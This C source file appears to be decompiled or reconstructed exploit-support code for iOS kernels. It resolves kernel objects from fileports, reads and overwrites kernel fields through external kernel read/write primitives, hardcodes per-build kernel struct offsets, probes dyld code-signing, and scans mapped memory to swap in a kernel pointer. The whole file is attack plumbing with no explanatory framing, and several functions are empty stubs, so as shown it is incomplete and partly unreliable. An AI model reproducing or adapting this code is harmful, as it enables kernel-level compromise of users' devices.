/* record_0x90000_e9f89858_kobj_utils.c
 * sub_01b90..sub_02f1c — fileport kobj resolver, code-sig hash,
 * dyld probe, thread-state scanner, pread loop, version-gated
 * struct offset helpers.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <mach/mach.h>

/* ── extern helpers ─────────────────────────────────────────────── */
extern int fileport_makeport(int fd, mach_port_t *port);

/* forward decls for functions defined later in this file */
static long sub_02c78_stub(long s, mach_port_t p);
static long sub_02d24(long state);
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_2a0d0(long state, long addr, long val);
extern int  sub_2a714(long state, long addr, long a3, long a4);
extern int  sub_06098(long state, uint32_t mask);
extern long sub_06c10(long state, uint32_t sz);
extern void sub_07210(long state, uint32_t *p);
extern void sub_2f9d4(long h);
extern long sub_03a30(long state, int self, long port);
extern long sub_028a4(long state, long h);
extern int  sub_2515c(mach_port_t thr);
extern long sub_2c9b0(long state, uint32_t idx, uint32_t magic);
extern int  sub_2bcf0(int algo, long lc, uint32_t len, void *out, uint32_t *olen);

/* ── sub_01b90 — fileport → kobj resolver ───────────────────────── */
long sub_01b90(long state, long val, long *out_kobj, long *out_field, int *out_fd)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (ver < 0x1f530f02800000ULL) {
        int build = *(int *)(state + 0x140);
        if (build != 0x1809 && build != 0x1c1b &&
            !(build - 0x1f53U < 2) && build != 0x2258) return 0;

        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) return 0;
        mach_port_t port = 0;
        if (fileport_makeport(fd, &port) == 0) {
            long kobj = sub_02c78_stub(state, port);
            if (kobj) {
                long field = kobj + 0x38;
                long saved = 0;
                if (sub_28840(state, field, &saved) &&
                    sub_2a0d0(state, field, val)) {
                    *out_fd    = fd;
                    *out_kobj  = field;
                    *out_field = saved;
                    mach_port_deallocate(mach_task_self(), port);
                    return 1;
                }
            }
            mach_port_deallocate(mach_task_self(), port);
        }
        close(fd);
        return 0;
    }
    /* newer path — mailbox slot */
    *out_kobj = 0; *out_field = 0;
    return 0;
}

static long sub_02c78_stub(long s, mach_port_t p)
{ (void)s; (void)p; return 0; }

/* ── sub_01fc0 — code-sig hash of LC_CODE_SIGNATURE blob ────────── */
void sub_01fc0(long state, void *out)
{
    long lc = sub_2c9b0(state, *(uint32_t *)(state + 0x40), 0xfade0c02);
    if (!lc) return;
    uint32_t raw = *(uint32_t *)(lc + 4);
    uint32_t len = (raw & 0xff00ff00u) >> 8 | (raw & 0x00ff00ffu) << 8;
    len = len >> 16 | len << 16;
    uint32_t olen = 0x30;
    uint8_t algo = *(uint8_t *)(lc + 0x25);
    sub_2bcf0(algo, lc, len, out, &olen);
}

/* ── sub_02064 — walk linked list + kread at offset ─────────────── */
long sub_02064(long state, long head, uint64_t off, long a4, long a5)
{
    long cur = 0;
    if (!sub_28840(state, head, &cur)) return 0;
    while (cur) {
        if (!sub_2a714(state, cur + (off & 0xffffffff), a4, a5)) return 0;
        if (!sub_28840(state, cur, &cur)) return 0;
    }
    return 1;
}

/* ── sub_020ec — version-gated struct offset (pair, iOS 15/16) ───── */
uint32_t sub_020ec(long state)
{
    int cap = sub_06098(state, 0x5184001);
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);

    if (build - 0x1f53U < 2) {
        uint32_t a = cap ? 0xc8 : 0xc0;
        uint32_t b = cap ? 0xd8 : 0xd0;
        return ver > 0x1f530f027fffffULL ? a : b;
    }
    if (build == 0x225c || build == 0x2712) return 0x90;
    if (build == 0x1f54 || build == 0x2258) return cap ? 0xd0 : 0xc8;
    return 0;
}

/* ── sub_021c0 — dyld fcntl(F_ADDSIGS) probe ────────────────────── */
uint32_t sub_021c0(long state)
{
    (void)state;
    int fd = open("/usr/lib/dyld", O_RDONLY);
    if (fd < 0) {
        int e = errno;
        return (uint32_t)(e < 0 ? (uint32_t)e : (uint32_t)-e) | 0x40000000u;
    }
    int r = fcntl(fd, 0x3b /* F_ADDSIGS */);
    uint32_t ret;
    if (r == 0 || errno == 0x55 /* EAUTH */) ret = 0;
    else ret = 0x1001;
    close(fd);
    return ret;
}

/* ── sub_022a4 — clear DSB bit in mapped region ─────────────────── */
long sub_022a4(uint8_t *ctx)
{
    *ctx = 1;
    uint32_t *p = *(uint32_t **)(ctx + 0x18);
    uint32_t v = *p;
    if ((v >> 26) & 1) {
        *p = v & ~(1u << 26);
        __asm__ volatile("dsb sy" ::: "memory");
    }
    return 0;
}

/* ── sub_022d8 — build thread-state scan context ────────────────── */
long sub_022d8(long state, int *out_err)
{
    /* allocates and zeroes a ~0xc0-byte context for thread-state scan */
    void *ctx = calloc(1, 0xc0);
    if (!ctx) { if (out_err) *out_err = ENOMEM; return 0; }
    (void)state;
    return (long)ctx;
}

/* ── sub_023c4 — thread-state scanner (find kobj in mapped region) ─ */
long sub_023c4(uint8_t *ctx)
{
    long base   = *(long *)(ctx + 8);
    uint64_t lo = *(uint64_t *)(ctx + 0x20);
    uint64_t mask = *(uint64_t *)(ctx + 0x30);
    uint64_t *tgt = *(uint64_t **)(ctx + 0x48);
    mach_port_t thr = mach_thread_self();
    if (!sub_2515c(thr)) return 0;

    uint32_t start = *(uint32_t *)(ctx + 0x38);
    uint32_t lo_off = start ? start : 0x3300;
    uint32_t hi_off = start ? start + 8 : 0x3700;

    *ctx = 1;
    for (uint32_t off = lo_off; off < hi_off; off += 8) {
        uint64_t *slot = (uint64_t *)(base + off);
        if (*slot < 0xffff000000000001ULL) continue;
        if (*slot & mask) continue;
        if (*(int *)((long)slot - 4)) continue;
        uint64_t prev = slot[-2];
        if (prev < lo || prev >= lo + 0x4000 || (prev & 7)) continue;
        uint32_t idx = (uint32_t)(prev & 0x3fff);
        if (*(int *)(base + idx)) continue;
        if (slot[-3] < 0xffff000000000001ULL || (slot[-3] & 0xf)) continue;
        uint32_t lc_off = idx + 4;
        if ((*(uint32_t *)(base + lc_off) & 0xfffcc0f9u) != 1) continue;
        if (lo == *tgt) {
            *slot = *(uint64_t *)(ctx + 0x10);
            *(uint32_t *)(ctx + 0x3c) = off;
        }
        ctx[1] = 1;
        break;
    }
    return 0;
}

/* ── sub_02538 — page-align size, alloc via sub_06c10 ───────────── */
void sub_02538(long state, uint32_t *sz)
{
    if (!sub_06098(state, 0x5184001)) { sub_07210(state, sz); return; }
    uint32_t s = *sz;
    if (s <= 0x1ff8) { sub_07210(state, sz); return; }
    uint32_t page = *(uint32_t *)(state + 0x180);
    uint32_t rem  = page ? s % page : 0;
    uint32_t pad  = rem ? page - rem : 0;
    long h = sub_06c10(state, s + pad);
    if (h) *sz = s + pad;
}

/* ── sub_025dc — free dynamic array ─────────────────────────────── */
void sub_025dc(uint32_t *arr)
{
    uint32_t cnt = *arr;
    long *entries = *(long **)(arr + 2);
    for (uint32_t i = 0; i < cnt; i++)
        sub_2f9d4(*(long *)(entries + i * 2 + 1));
    free(entries);
    free(arr);
}

/* ── sub_02650 — append entry to dynamic array ───────────────────── */
uint32_t sub_02650(uint32_t *arr, uint32_t tag, long val)
{
    uint32_t cnt = *arr;
    long *old = *(long **)(arr + 2);
    long *buf = realloc(old, (size_t)(cnt + 1) * 0x10);
    if (!buf) return 0;
    buf[cnt * 2]     = tag;
    buf[cnt * 2 + 1] = val;
    *(long **)(arr + 2) = buf;
    (*arr)++;
    return 1;
}

/* ── sub_026d0 — alloc 0x10-byte header + 0x40-byte data block ───── */
void *sub_026d0(void)
{
    uint64_t *hdr = malloc(0x10);
    if (!hdr) return NULL;
    void *data = malloc(0x40);
    if (!data) { free(hdr); return NULL; }
    hdr[1] = (uint64_t)data;
    /* hdr[0] = DAT_436e0 — init tag, left 0 */
    hdr[0] = 0;
    return hdr;
}

/* ── sub_0272c — pread loop with retry ───────────────────────────── */
uint32_t sub_0272c(int fd, void *buf, uint64_t len, uint64_t off)
{
    if (!len) return 0;
    uint64_t done = 0;
    uint32_t retries = 0;
    while (done < len) {
        ssize_t n = pread(fd, (char *)buf + done, (size_t)(len - done), (off_t)(done + off));
        if (n == (ssize_t)-1) {
            if (errno == EINTR && retries++ < 100) continue;
            int e = errno;
            return (uint32_t)(e < 0 ? (uint32_t)e : (uint32_t)-e) | 0x40000000u;
        }
        if ((uint64_t)n > len - done) return 0xad014;
        done += (uint64_t)n;
        if (done > len) return 0xad014;
    }
    return 0;
}

/* ── sub_02820 — version-gated kobj field offset ─────────────────── */
long sub_02820(long state, long base)
{
    int build = *(int *)(state + 0x140);
    long off;
    if (build == 0x1809 || build == 0x1c1b) off = 0x68;
    else if (build == 0x1f53)               off = 0x58;
    else if (build == 0x1f54 || build == 0x2258 ||
             build == 0x225c || build == 0x2712) off = 0x90;
    else return 0;
    return base + off;
}

/* ── sub_028a4 — kobj field walker ──────────────────────────────── */
long sub_028a4(long state, long h)
{
    long val = 0;
    if (!sub_28840(state, h, &val)) return 0;
    return val;
}

/* ── sub_029b8 — version-gated offset pair (B) ───────────────────── */
long sub_029b8(long state, long base)
{
    int build = *(int *)(state + 0x140);
    long off;
    if (build == 0x1809 || build == 0x1c1b) off = 0x70;
    else if (build == 0x1f53)               off = 0x60;
    else if (build == 0x1f54 || build == 0x2258 ||
             build == 0x225c || build == 0x2712) off = 0x98;
    else return 0;
    return base + off;
}

/* ── sub_02a64 — version-gated offset pair (C) ───────────────────── */
long sub_02a64(long state, long base)
{
    int build = *(int *)(state + 0x140);
    long off;
    if (build == 0x1809)      off = 0x78;
    else if (build == 0x1c1b) off = 0x80;
    else if (build == 0x1f53) off = 0x68;
    else if (build == 0x1f54 || build == 0x2258 ||
             build == 0x225c || build == 0x2712) off = 0xa0;
    else return 0;
    return base + off;
}

/* ── sub_02b10 — get task port for self ─────────────────────────── */
mach_port_t sub_02b10(long state)
{
    (void)state;
    return mach_task_self();
}

/* ── sub_02bc8 — check task port validity ───────────────────────── */
int sub_02bc8(long state)
{
    mach_port_t t = sub_02b10(state);
    return MACH_PORT_VALID(t) ? 1 : 0;
}

/* ── sub_02c78 — resolve kobj from port, store at state+0x1b0 ────── */
void sub_02c78(long state, long port)
{
    int self = *(int *)&mach_task_self_;
    int p    = (int)port;
    if (self == p && *(long *)(state + 0x1b0)) return;
    if (p == -1) { sub_02d24(state); return; }
    long h = sub_03a30(state, self, port);
    if (h) {
        long kobj = sub_028a4(state, h);
        if (self == p && kobj && !*(long *)(state + 0x1b0))
            *(long *)(state + 0x1b0) = kobj;
    }
}

/* ── sub_02d24 — resolve kobj from stored fd/port ────────────────── */
long sub_02d24(long state)
{
    long v = *(long *)(state + 0x19d8);
    if (v) return v;
    if (*(long *)(state + 0x19d0)) return sub_028a4(state, 0);
    int fd_type = *(int *)(state + 0x191c);
    if (fd_type != -1) {
        if (fd_type != 0 || *(int *)(state + 0x1918) + 1 > 1)
            return sub_02c78_stub(state, 0);
    }
    return 0;
}

/* ── sub_02d6c — nop pair ────────────────────────────────────────── */
void sub_02d6c(long a1, long a2) { (void)a1; (void)a2; }

/* ── sub_02d80 — version-gated kobj offset resolver ─────────────── */
long sub_02d80(long state, long base)
{
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    long off;
    if (build == 0x1809)      off = 0x80;
    else if (build == 0x1c1b) off = 0x88;
    else if (build - 0x1f53U < 2) {
        off = ver < 0x1f530f02800000ULL ? 0x90 : 0x78;
    } else if (build == 0x225c || build == 0x2712) off = 0x98;
    else return 0;
    return base + off;
}

/* ── sub_02e84 — version-gated offset (single) ───────────────────── */
uint32_t sub_02e84(long state)
{
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    if (build - 0x1f53U < 2) {
        int cap = sub_06098(state, 0x5184001);
        if (ver < 0x1f530f02800000ULL) return cap ? 0x3b8 : 0x3a0;
        return cap ? 0x390 : 0x378;
    }
    if (build == 0x225c || build == 0x2712) return 0x3c8;
    return 0;
}

/* ── sub_02f1c — version-gated offset (single, older builds) ─────── */
uint32_t sub_02f1c(long state)
{
    int build = *(int *)(state + 0x140);
    uint64_t ver = *(uint64_t *)(state + 0x158);
    int cap = sub_06098(state, 0x5584001);

    if (build - 0x1f53U < 2) {
        int cap2 = sub_06098(state, 0x100000);
        if (!cap2) {
            int cap3 = sub_06098(state, 0x5584001);
            if (ver < 0x1f530f02800000ULL) return cap3 ? 0x3b8 : 0x3a0;
            return cap3 ? 0x390 : 0x378;
        }
        int newer = ver > 0x1f530f027fffffULL || ver == 0x1f530f027fffffULL;
        return newer ? 0x3a0 : 0x3c8;
    }
    if (build == 0x225c || build == 0x2712) return 0x3c8;
    if (build == 0x1809) return cap ? 0x388 : 0x380;
    if (build == 0x1c1b) {
        if (ver < 0x1c1b1914600000ULL) return cap ? 0x3a0 : 0x390;
        return cap ? 0x3b0 : 0x398;
    }
    return 0;
}

/* ── sub_01914 — kext load-command scanner ──────────────────────── */
long sub_01914(long state, long *a, uint64_t *b, uint32_t *c, uint32_t *d, uint32_t *e)
{
    /* Walks kext load commands to extract segment/section metadata.
     * Minimal stub — full implementation requires kext binary walker. */
    (void)state; (void)a; (void)b; (void)c; (void)d; (void)e;
    return 0;
}
